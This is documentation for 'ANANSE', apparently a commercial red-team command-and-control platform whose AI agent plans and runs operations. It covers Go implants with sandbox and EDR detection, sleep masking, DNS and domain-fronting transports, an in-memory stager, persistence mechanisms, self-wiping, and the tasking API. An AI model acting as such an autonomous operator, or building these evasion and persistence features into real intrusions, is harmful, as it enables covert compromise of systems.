Overview

ANANSE is an autonomous security operations platform. It combines a command-and-control (C2) server, cross-platform implants, and an AI agent interface into a unified system for red-team and blue-team operations.

The platform is built in two layers: a TypeScript control plane (the C2 server, CLI, and AI agent) and a Go implant layer that runs on target systems. The AI agent orchestrates operations through natural language — describe your objective and Ananse plans, executes, and reports.

Licensing: ANANSE uses Ed25519-signed licence keys with offline verification. No telemetry or phone-home required. See pricing.

Architecture

The system has three main components:

  • C2 Server — HTTP/WebSocket command-and-control server that manages implants, tasks, and results. Built with Express on Node.js.
  • Implant — Go-based agent deployed on target systems. Communicates via beaconing, executes tasks, and exfiltrates results.
  • AI Agent — Natural-language interface that translates user objectives into C2 operations. Supports multiple LLM providers.

C2 Platform

Server

The C2 server exposes a REST API and optional WebSocket endpoint. Implants authenticate via bearer tokens and communicate through periodic beacons. The server maintains a task queue for each implant and stores completed results.

Start the server:

ananse c2-server --port 8443

# List implants
ananse c2 reach

# List tasks for an implant
ananse c2 task list <implant-id>

# Get task result
ananse c2 task result <task-id>

# Self-destruct an implant
ananse c2 kill <implant-id>

Implant

The Go implant is a lightweight, cross-platform agent that runs on Linux, Windows, and macOS targets. It communicates with the C2 server through configurable transport protocols, executes modules on demand, and maintains stealth through profiling and memory masking.

Build

# Cross-compile for all targets
GOOS=linux GOARCH=amd64 go build -o implant-linux .
GOOS=windows GOARCH=amd64 go build -o implant-windows.exe .
GOOS=darwin GOARCH=amd64 go build -o implant-darwin .

Beacon Loop

  1. Profiler runs — collects system metadata, checks for VMs/sandboxes, assesses threat level
  2. Heartbeat sent via transport chain — includes profile, pending results, system status
  3. Server responds with tasks to execute, acknowledgements, and config updates
  4. Tasks executed asynchronously with stealth delays between them
  5. Pending results attached to next heartbeat
  6. Sleep mask encrypts sensitive data in memory during idle period
  7. Beacon interval adjusted dynamically based on threat level

Multi-Protocol Transport

Implants use a configurable transport chain with automatic fallback. Transports are tried in order; after 3 consecutive failures, the next transport is attempted. On any success, the chain rotates back toward the primary transport.

HTTP (Primary)

Standard HTTPS POST to /api/v1/beacon. Supports optional SOCKS5 proxy for routing through Tor or other proxies.

WebSocket

Persistent connection to /api/v1/implant/ws. Authentication via JSON auth frame on connect. More efficient for high-frequency beaconing.

DNS

Encodes heartbeat as base32 subdomain queries to a configured DNS domain. Server responds via TXT records. Useful for air-gapped or heavily monitored environments where HTTP is blocked.

Domain Fronting

Wraps HTTPS transport with a CDN front — resolves to the CDN edge but sets the Host header to the real C2 domain. TLS SNI is set to the CDN hostname.

Stealth & Evasion

Profiler

The profiler runs in phases at startup and periodically during the beacon loop:

  1. Quick check — immediate sandbox/EDR detection before first beacon
  2. Phase 2 — system metadata (hostname, OS, kernel, uptime, CPU, memory, disk)
  3. Phase 3 — security tools, debuggers, network connections, listening ports
  4. Phase 4 — VM/sandbox detection via DMI, MAC vendor, CPU count, disk size, battery

Threat Scoring

  • +5 per security tool detected (Wireshark, Burp, IDA, etc.)
  • +5 per debugger detected (strace, gdb, ltrace, dtrace)
  • +10 if multiple EDR/AV processes running
  • +5 VM detected (DMI product name, MAC vendor prefix)
  • +15 sandbox detected (low CPU, low disk, no battery)
  • +5 firewall/auditd enabled

Threat levels: low (0–9), medium (10–19), high (20–29), critical (30+)

Sleep Mask

AES-128-GCM in-memory encryption of sensitive data (token, implant ID, pending results) during idle periods between beacons. Plaintext buffers are zeroed after encryption. Enabled by default, disabled with --no-sleep-mask.

Adaptive Behavior

  • Command obfuscation enabled at medium threat and above
  • Beacon interval increases with threat level (jitter and delay between ops)
  • Extra delay before first beacon if sandbox/EDR detected

Deployment

Staged Payload

The stager is a minimal Go binary that fetches the full implant from the C2 server and executes it in memory. This reduces the initial download size and allows the server to rotate payloads. 

# Build the stager
cd src/c2/implant/stager && go build -o stager-linux .

# Deploy with the CLI
ananse c2 deploy user@target

Watchdog Persistence

The implant installs watchdog persistence on first run (unless --no-persist):

  • Linux: systemd user service or cron @reboot
  • Windows: Registry Run key or scheduled task
  • macOS: LaunchAgent plist

Self-Destruct

The c2 kill command queues a self-destruct task. On receipt, the implant:

  1. Waits briefly for running tasks to finish
  2. Removes watchdog persistence
  3. Wipes the binary from disk
  4. Cleans up implant ID files
  5. Exits

API Reference

The C2 server exposes a REST API. All endpoints return JSON and require authentication via the Authorization: Bearer <token> header (for server-side API key) or the implant token.

Endpoints

List Implants

GET /api/v1/reach
Authorization: Bearer <api-key>

→ { "total": 5, "active": 1, "dead": 4, "implants": [...] }

Create Task

POST /api/v1/implant/:id/task
Authorization: Bearer <api-key>
{ "type": "recon_all", "params": {} }

→ { "taskId": "...", "type": "recon_all", "status": "pending", "createdAt": "..." }

List Tasks

GET /api/v1/implant/:id/tasks
Authorization: Bearer <api-key>

→ [{ "taskId": "...", "type": "...", "status": "...", "createdAt": "..." }]

Task Detail

GET /api/v1/task/:taskId
Authorization: Bearer <api-key>

→ { "taskId": "...", "implantId": "...", "type": "...",
    "status": "...", "params": {}, "result": { "success": true, "data": "..." },
    "createdAt": "...", "deliveredAt": "...", "completedAt": "..." }

Cancel Task

DELETE /api/v1/task/:taskId
Authorization: Bearer <api-key>

→ { "ok": true }

Implant Beacon

POST /api/v1/beacon
Authorization: Bearer <implant-token>
{ "implantId": "...", "status": "active", ... }

→ { "command": "", "tasks": [...], "ackedResults": [...], "config": {} }

WebSocket

WS /api/v1/implant/ws
→ JSON auth frame → JSON beacon/responses
